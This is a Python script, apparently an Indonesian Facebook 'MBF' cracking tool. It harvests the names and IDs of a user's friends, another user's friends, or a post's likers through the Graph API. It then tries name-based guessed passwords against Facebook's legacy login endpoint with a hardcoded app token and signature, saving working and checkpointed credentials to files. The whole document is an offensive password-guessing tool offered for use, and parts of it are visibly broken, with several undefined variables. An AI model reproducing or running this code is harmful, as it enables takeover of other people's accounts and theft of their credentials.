q="\033[00m"
h2="\033[40m"
b2="\033[44m"
c2="\033[46m"
i2="\033[42m"
u2="\033[45m"
m2="\033[41m"
p2="\033[47m"
k2="\033[43m"
b='\033[1;94m'
i='\033[1;92m'
c='\033[1;96m'
m='\033[1;91m'
u='\033[1;95m'
k='\033[1;93m'
p='\033[1;97m'
h='\033[1;90m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH 
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
import requests
import sys
import os
import subprocess
import random
import time
import re
import json
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from datetime import datetime
try:
	import requests
except ImportError:
	os.system("pip2 install requests")

id=[]
die=0
cp=[]
ok=[]

ua = ("Mozilla/5.0 (Linux; Android 4.1.3; GT-I8190N Build/GRK39F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]") 
s = requests.Session()
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]

def back():
    input(N+"["+warna+" Press Enter To Back "+N+"]")
    os.system('python mbf.py')
def baner():
    os.system("cls" if os.name == "nt" else "clear")
    print("""   
   ╔═╗┬┌┬┐┌─┐┬ ┌─┐   ╔╦╗   ╔╗   ╔═╗
   ╚═╗││││├─┘│├┤   ║║║   ╠╩╗╠╣ 
   ╚═╝┴┴┴┴┴─┘└─┘   ╩╩╚═╝   ╚  \033[00m""")

    print("   "+Back.WHITE+BL+"      By : Fahmi Apz      \n\033[00m")
def masuk():
    try:
        tk=open("token").read()
    except IOError:
        tk=input(QUE+N+"Token "+N+":"+warna+" ")
    req=requests.get("https://graph.facebook.com/me?access_token="+tk).text
    if "id" in req:
        with open("token","w") as ex:
             ex.write(tk)
        return tk
    else:
        print(ERR+"Token Not Valid!")
        back()
def info():
    req=requests.get(f"https://graph.facebook.com/me?fields=name,id&access_token={token}").text
    js=json.loads(req)
    print(W+"   Login as : "+warna+js["name"])
    print(W+"   ID       : "+warna+js["id"])
    print()
def home():
    baner()
    print(f"""
   1). Go To Menu
   2). Delete Token
   0). Exit\033[00m""")
    f=input(W+"   >> "+warna)
    if f == "01" or f == "1":
       if not masuk():
              print(ERR +' You Must Login!')
              back()
       else:
              menu()
    elif f == "02" or f == "2":
       try:
           os.remove('token')
       except:
            pass
       print()
       print(INF + "Done!")
       back()
    elif f == "00" or f == "0":
       baner()
       sys.exit(W+"   Thanks you for use this tool :)")
def menu():
    baner()
    info()
    print(f"""   
   1). Crack From Friendlist
   2). Crack From Friend    
   3). Crack From Post
   0). Back""")
    f=input(W+"   >> "+warna)
    if f == "00" or f == "0":
       home()
    if f == "01" or f == "1":
       baner()
       info()
       req=requests.get(f"https://graph.facebook.com/me?fields=friends.limit(5000)&access_token={token}").text
       js=json.loads(req)
       for x in js['friends']['data']:
           id.append(x['name'] + '|' + x['id'])
       print(QUE+"Start Crack...")
       for user in id:
           ss=user.split("|")
           us=ss[0].split(" ")
           for x in us:
               litpas=[
                    str(x) + "123",
                    str(x) + "1234",
                    str(x) + "12345"
               ]
               litpas.append('Sayang','Indonesia')
               for passw in set(litpas):
                   login(ss[1],passw)
       print(INF+"Done!")
       back()
    elif f == "02" or f == "2":
       baner()
       info()
       uid=input(QUE+"User/ID : "+warna)
       req=requests.get(f"https://graph.facebook.com/{uid}?fields=friends.limit(5000)&access_token={token}").text
       js=json.loads(req)
       for x in js["friends"]["data"]:
           id.append(x["name"] + "|" + x["id"])
       print(QUE+"Start Crack...")
       for user in id:
           ss=user.split("|")
           us=ss[0].split(" ")
           for x in us:
               litpas=[
                    str(x) + "123",
                    str(x) + "1234",
                    str(x) + "12345"
               ]
               litpas.append('Sayang','Indonesia')
               for passw in set(litpas):
                   login(ss[1],passw)
       print(INF+"Done!")
       back()
    elif f == "03" or f == "3":
       baner()
       info()
       cc=input(QUE+"PostID : "+warna)
       req=requests.get(f"https://graph.facebook.com/{cc}?fields=likes.sumary(true)&access_token={token}").text
       js=json.loads(req)
       for x in js["likes"]["data"]:
           id.append(x["name"] + "|" + x["id"])
       print(QUE+"Start Crack...")
       for user in id:
           ss=user.split('|')
           us=ss[0].split(' ')
           for x in us:
               litpas=[
                    str(x) + "123",
                    str(x) + "1234",
                    str(x) + "12345"
               ]
               litpas.append('Sayang','Indonesia')
               for passw in set(litpas):
                   login(ss[1],passw)
       print(INF+"Done!")
       back()
def login(username,password,cek=False):
          global die
          b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
          params = {
                   'access_token': b,
                   'format': 'JSON',
                   'sdk_version': '2',
                   'email': username,
                   'locale': 'en_US',
                   'password': password,
                   'sdk': 'ios',
                   'generate_session_cookies': '1',
                   'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
          }
          api = 'https://b-api.facebook.com/method/auth.login'
          response = requests.get(api, params=params)
          if "EAA" in response.text:
             print(f"   [Ok] \033[00m{username}<->\033[00m{password}")
             if cek:
                ok.append(username + "|" + password)
             else:
                with open('life.txt','a') as ex:
                     ex.write(username + "|" + password + "\n")
          elif "www.facebook.com" in response.json()['error_msg']:
               print(f"   [Cp] \033[00m{username}<->\033[00m{password}")
               if cek:
                  cp.append(username + "|" + password)
               else:
                  with open("check.txt","a") as ex:
                       ex.write(username + "|" + password + "\n")
          else:
               die+=1
if __name__=="__main__":
    rd=[Y,G,C,M]
    warna=random.choice(rd)
    baner()
    token=masuk()
    home()
